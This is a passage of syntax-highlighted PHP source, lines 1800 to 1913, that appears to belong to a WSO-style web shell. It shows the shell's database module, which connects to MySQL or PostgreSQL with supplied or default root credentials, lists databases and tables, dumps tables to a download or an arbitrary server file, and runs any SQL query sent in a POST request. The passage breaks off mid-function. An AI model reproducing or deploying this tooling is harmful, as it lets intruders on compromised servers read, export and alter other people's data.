<span class="lineno">1800</span>         <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1801</span>             <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
<span class="lineno">1802</span>             <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=dump.sql&quot;</span><span class="p">);</span>
<span class="lineno">1803</span>             <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span>
<span class="lineno">1804</span>             <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
<span class="lineno">1805</span>                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1806</span>             <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1807</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1808</span>             <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
<span class="lineno">1809</span>                 <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">1810</span>             <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">1811</span>             <span class="nb">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1812</span>         <span class="p">}</span> <span class="k">else</span>
<span class="lineno">1813</span>             <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&amp;lt;script&amp;gt;alert(&quot;Error! Can\&#39;t open file&quot;);window.history.back(-1)&amp;lt;/script&amp;gt;&#39;</span><span class="p">);</span>
<span class="lineno">1814</span>    <span class="p">}</span>
<span class="lineno">1815</span>    <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1816</span>    <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1817</span> <span class="s2">&amp;lt;div class=header&amp;gt;</span>
<span class="lineno">1818</span> <span class="s2">&amp;lt;form name=&#39;sf&#39; method=&#39;post&#39; onsubmit=&#39;fs(this);&#39;&amp;gt;&amp;lt;table cellpadding=&#39;2&#39; cellspacing=&#39;0&#39;&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="lineno">1819</span> <span class="s2">&amp;lt;td&amp;gt;Type&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Host&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Login&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Password&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Database&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="lineno">1820</span> <span class="s2">&amp;lt;input type=hidden name=a value=Sql&amp;gt;&amp;lt;input type=hidden name=p1 value=&#39;query&#39;&amp;gt;&amp;lt;input type=hidden name=p2 value=&#39;&#39;&amp;gt;&amp;lt;input type=hidden name=c value=&#39;&quot;</span><span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=hidden name=charset value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="lineno">1821</span> <span class="s2">&amp;lt;td&amp;gt;&amp;lt;select name=&#39;type&#39;&amp;gt;&amp;lt;option value=&#39;mysql&#39; &quot;</span><span class="p">;</span>
<span class="lineno">1822</span>     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;mysql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>
<span class="lineno">1823</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;MySql&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;pgsql&#39; &quot;</span><span class="p">;</span>
<span class="lineno">1824</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span>
<span class="lineno">1825</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;PostgreSql&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno">1826</span> <span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_host value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;localhost&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno">1827</span> <span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_login value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;root&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno">1828</span> <span class="s2">&amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_pass value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">]))</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1829</span>    <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;input type=text name=sql_base value=&#39;&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1830</span>    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])){</span>
<span class="lineno">1831</span>        <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1832</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno">1833</span>                <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1834</span>                <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1835</span>                <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1836</span>                <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1837</span>                <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1838</span>            <span class="p">}</span>
<span class="lineno">1839</span>            <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">listDbs</span><span class="p">();</span>
<span class="lineno">1840</span>            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;select name=sql_base&amp;gt;&amp;lt;option value=&#39;&#39;&amp;gt;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1841</span>            <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1842</span>                <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno">1843</span>                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$value</span><span class="o">==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/option&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1844</span>            <span class="p">}</span>
<span class="lineno">1845</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/select&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1846</span>        <span class="p">}</span>
<span class="lineno">1847</span>        <span class="k">else</span> <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
<span class="lineno">1848</span>    <span class="p">}</span><span class="k">else</span>
<span class="lineno">1849</span>        <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
<span class="lineno">1850</span>    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;</span>
<span class="lineno">1851</span> <span class="s2">              &amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39; onclick=&#39;fs(d.sf);&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno">1852</span> <span class="s2">                &amp;lt;td&amp;gt;&amp;lt;input type=checkbox name=sql_count value=&#39;on&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="s1">&#39; checked&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;gt; count the number of rows&amp;lt;/td&amp;gt;</span>
<span class="lineno">1853</span> <span class="s2">          &amp;lt;/tr&amp;gt;</span>
<span class="lineno">1854</span> <span class="s2">      &amp;lt;/table&amp;gt;</span>
<span class="lineno">1855</span> <span class="s2">      &amp;lt;script&amp;gt;</span>
<span class="lineno">1856</span> <span class="s2">            s_db=&#39;&quot;</span><span class="o">.@</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="lineno">1857</span> <span class="s2">            function fs(f) {</span>
<span class="lineno">1858</span> <span class="s2">                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};</span>
<span class="lineno">1859</span> <span class="s2">                    if(f.p1) f.p1.value=&#39;&#39;;</span>
<span class="lineno">1860</span> <span class="s2">                    if(f.p2) f.p2.value=&#39;&#39;;</span>
<span class="lineno">1861</span> <span class="s2">                    if(f.p3) f.p3.value=&#39;&#39;;</span>
<span class="lineno">1862</span> <span class="s2">                }</span>
<span class="lineno">1863</span> <span class="s2">            }</span>
<span class="lineno">1864</span> <span class="s2">          function st(t,l) {</span>
<span class="lineno">1865</span> <span class="s2">              d.sf.p1.value = &#39;select&#39;;</span>
<span class="lineno">1866</span> <span class="s2">              d.sf.p2.value = t;</span>
<span class="lineno">1867</span> <span class="s2">                if(l &amp;&amp; d.sf.p3) d.sf.p3.value = l;</span>
<span class="lineno">1868</span> <span class="s2">              d.sf.submit();</span>
<span class="lineno">1869</span> <span class="s2">          }</span>
<span class="lineno">1870</span> <span class="s2">          function is() {</span>
<span class="lineno">1871</span> <span class="s2">              for(i=0;i&amp;lt;d.sf.elements[&#39;tbl[]&#39;].length;++i)</span>
<span class="lineno">1872</span> <span class="s2">                  d.sf.elements[&#39;tbl[]&#39;][i].checked = !d.sf.elements[&#39;tbl[]&#39;][i].checked;</span>
<span class="lineno">1873</span> <span class="s2">          }</span>
<span class="lineno">1874</span> <span class="s2">      &amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1875</span>    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">){</span>
<span class="lineno">1876</span>        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br/&amp;gt;&amp;lt;table width=100% cellpadding=2 cellspacing=0&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1877</span>            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])){</span>
<span class="lineno">1878</span>                <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
<span class="lineno">1879</span>                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td width=1 style=&#39;border-top:2px solid #666;&#39;&amp;gt;&amp;lt;span&amp;gt;Tables:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1880</span>                <span class="nv">$tbls_res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">listTables</span><span class="p">();</span>
<span class="lineno">1881</span>                <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$tbls_res</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1882</span>                    <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno">1883</span>                     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">]))</span>
<span class="lineno">1884</span>                         <span class="nv">$n</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">));</span>
<span class="lineno">1885</span>                    <span class="nv">$value</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
<span class="lineno">1886</span>                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;nobr&amp;gt;&amp;lt;input type=&#39;checkbox&#39; name=&#39;tbl[]&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;nbsp;&amp;lt;a href=# onclick=</span><span class="se">\&quot;</span><span class="s2">st(&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;,1)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_count&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&amp;nbsp;&#39;</span><span class="o">:</span><span class="s2">&quot; &amp;lt;small&amp;gt;(</span><span class="si">{</span><span class="nv">$n</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">)&amp;lt;/small&amp;gt;&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/nobr&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1887</span>                <span class="p">}</span>
<span class="lineno">1888</span>                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=&#39;checkbox&#39; onclick=&#39;is();&#39;&amp;gt; &amp;lt;input type=button value=&#39;Dump&#39; onclick=&#39;document.sf.p2.value=</span><span class="se">\&quot;</span><span class="s2">download</span><span class="se">\&quot;</span><span class="s2">;document.sf.submit();&#39;&amp;gt;&amp;lt;br&amp;gt;File path:&amp;lt;input type=text name=file value=&#39;dump.sql&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=&#39;border-top:2px solid #666;&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1889</span>                <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;select&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1890</span>                    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;query&#39;</span><span class="p">;</span>
<span class="lineno">1891</span>                     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">1892</span>                    <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1893</span>                    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">();</span>
<span class="lineno">1894</span>                    <span class="nv">$pages</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">30</span><span class="p">);</span>
<span class="lineno">1895</span>                     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script&amp;gt;d.sf.onsubmit=function(){st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, d.sf.p3.value)}&amp;lt;/script&amp;gt;&amp;lt;span&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt; (</span><span class="si">{</span><span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> records) Page # &amp;lt;input type=text name=&#39;p3&#39; value=&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1896</span>                     <span class="k">echo</span> <span class="s2">&quot; of </span><span class="si">$pages</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1897</span>                     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">1</span><span class="p">)</span>
<span class="lineno">1898</span>                         <span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=# onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&quot;, &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;)&#39;&amp;gt;&amp;lt; Prev&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1899</span>                     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$pages</span><span class="p">)</span>
<span class="lineno">1900</span>                         <span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=# onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&quot;, &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;)&#39;&amp;gt;Next &amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1901</span>                     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
<span class="lineno">1902</span>                    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span>
<span class="lineno">1903</span>                        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; LIMIT 30 OFFSET &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">);</span>
<span class="lineno">1904</span>                    <span class="k">else</span>
<span class="lineno">1905</span>                        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;` LIMIT &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;,30&#39;</span><span class="p">;</span>
<span class="lineno">1906</span>                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1907</span>                <span class="p">}</span>
<span class="lineno">1908</span>                <span class="k">if</span><span class="p">((</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;query&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1909</span>                    <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1910</span>                    <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1911</span>                        <span class="nv">$title</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1912</span>                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;table width=100% cellspacing=1 cellpadding=2 class=main style=&quot;background-color:#292929&quot;&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1913</span>                        <span class="nv">$line</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
